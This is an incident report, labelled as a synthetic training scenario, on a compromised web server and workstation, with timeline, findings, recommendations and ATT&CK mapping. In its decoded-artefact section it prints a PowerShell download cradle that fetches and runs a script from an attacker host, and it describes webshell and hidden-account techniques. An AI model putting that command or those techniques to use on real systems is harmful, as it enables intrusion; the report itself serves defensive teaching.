# Security Incident Report: Multi-Vector Compromise of web01 and WS-014

| | |
|---|---|
| **Report date** | 2026-10-28 |
| **Incident window** | 2026-10-27 02:50 - 08:42 UTC |
| **Severity** | Critical |
| **Status** | Contained pending actions below (assumed active until confirmed) |
| **Data** | Synthetic training scenario. IPs are from documentation ranges. |

## 1. Executive summary

An attacker gained root-level control of the web server **web01** (10.0.1.20) after guessing the password of the `deploy` account over SSH on the morning of 27 October. They downloaded and ran a script from `198.51.100.77`, created a hidden administrator account (`svc_backup`), and began a once-a-minute connection back to that server, consistent with remote-control (C2) software. Roughly five hours later a workstation (**WS-014**, user jsmith) opened a malicious Word document that ran a hidden PowerShell command contacting the **same** server, and set up a scheduled task to survive reboots.

Both hosts should be treated as fully compromised. Credentials stored on or used from them should be considered exposed. Customer data exposure is possible because SQL injection returned data-sized responses, but is not confirmed by these logs.

## 2. Scope and method

Four log sources were reviewed: Linux `auth.log`, Apache `access.log`, firewall log, and Windows Security events (CSV export). A Python parser (`analyze_logs.py`) extracted failed/successful logins, privileged commands, attack signatures in URLs, outbound beaconing, and decoded the PowerShell payload. Events were correlated by time and by IP.

## 3. What happened

1. **Reconnaissance (02:50-02:58).** 203.0.113.45 scanned for admin pages and sensitive files (Nikto), then ran sqlmap against `product.php`. Injected `UNION SELECT` queries returned HTTP 200 with larger responses each time.
2. **Web exploitation (03:00-03:06).** 192.0.2.88 used directory traversal to read `/etc/passwd`, tried `/etc/shadow` (blocked, 403), uploaded a file via `upload.php`, and ran `whoami` through `/uploads/shell.php`, indicating a working webshell.
3. **Initial access by SSH (03:12-03:19).** 42 failed logins across eight usernames from 203.0.113.45, then a success for `deploy`. The `deploy` account has sudo rights.
4. **Execution and persistence (03:20-03:23).** As root: `id`, download of `x.sh`, execution of `x.sh`, creation of `svc_backup` in the `sudo` group, and inspection of root's crontab.
5. **Command and control (03:24-03:35+).** Twelve connections at 60-second intervals to 198.51.100.77:4444, a classic beacon pattern, continued after the SSH session ended at 03:31.
6. **Lateral movement attempt (03:40).** web01 connected to SMB on 10.0.1.35 (allowed) and 10.0.1.36 (denied).
7. **Workstation compromise (04:00-08:42).** RDP guessing against WS-014 failed. At 08:41, `Invoice_Q3.docm` launched PowerShell with `-nop -w hidden -enc`. The decoded command downloads and executes `a.ps1` from 198.51.100.77. The attacker then ran `whoami /all` and created scheduled task `\Updater`.

## 4. Key decoded artefact

```
Encoded : SQBFAFgAIAAoAE4AZQB3AC... (base64, UTF-16LE)
Decoded : IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
```

Why it matters: Word should never start PowerShell. The `IEX` + `DownloadString` pattern fetches and runs code in memory, and the shared host ties the workstation to the web server incident.

## 5. Findings summary

See `findings.md` for the full table (F1-F10), timeline and IOCs. Highest-impact items:

- Weak or guessable password on a sudo-enabled account (`deploy`), reachable from the internet.
- SSH password authentication enabled, with no lockout or rate limit.
- SQL injection and file-traversal/upload flaws in the web application.
- Outbound traffic to the internet from a web server was unrestricted (ports 80 and 4444).
- Macros allowed to launch child processes on the workstation.

## 6. Recommendations

**Immediate (0-24 h)**
1. Isolate web01 and WS-014 from the network (preserve memory and disk first if forensics is planned).
2. Block 198.51.100.77, 203.0.113.45 and 192.0.2.88 at the perimeter; search all firewall/proxy/DNS logs for other hosts contacting 198.51.100.77.
3. Disable `deploy` and `svc_backup`; reset passwords for jsmith, Administrator, and any credential used on either host.
4. Hunt for the IOCs in the findings (`/tmp/.x.sh`, `shell.php`, scheduled task `\Updater`, `u.ps1`), and check 10.0.1.35 and 10.0.1.36 for compromise.
5. Rebuild web01 from a known-good image rather than cleaning it.

**Short term (1-4 weeks)**
6. Disable SSH password auth (keys only), restrict SSH to a VPN/bastion, add fail2ban or equivalent.
7. Fix `product.php` (parameterised queries) and `download.php`/`upload.php` (path validation, file-type checks, no execution in the uploads directory); deploy a WAF.
8. Block Office applications from spawning child processes (ASR rule) and restrict macros from the internet.
9. Egress filtering: servers should only reach approved destinations; alert on repeated fixed-interval outbound connections.
10. Enable PowerShell script-block logging (Event 4104) and forward all logs to a SIEM with alerts for: >10 failed logins then success, new sudo user, Office->PowerShell.

**Assess**
11. Determine whether the `users` table (usernames/passwords) was extracted; if so, begin breach-notification assessment and force password resets for application users.

## 7. Limitations

Logs show activity but not intent or payload contents. HTTP 200 does not prove data theft. Whether the two source IPs belong to one actor is uncertain. Disk and memory forensics on both hosts are needed to confirm what `x.sh`, `shell.php` and `a.ps1` did.

## 8. Appendix: MITRE ATT&CK mapping

| Tactic | Technique |
|---|---|
| Reconnaissance | T1595 Active Scanning |
| Initial Access | T1190 Exploit Public-Facing Application; T1566.001 Spearphishing Attachment; T1110 Brute Force |
| Execution | T1059.001 PowerShell; T1059.004 Unix Shell |
| Persistence | T1136.001 Create Local Account; T1053.005 Scheduled Task; T1505.003 Web Shell |
| Defense Evasion | T1027 Obfuscated Files (encoded command) |
| Discovery | T1033 System Owner Discovery (`whoami`) |
| Lateral Movement | T1021.002 SMB (attempted) |
| Command and Control | T1071 Application Layer Protocol; T1571 Non-Standard Port |
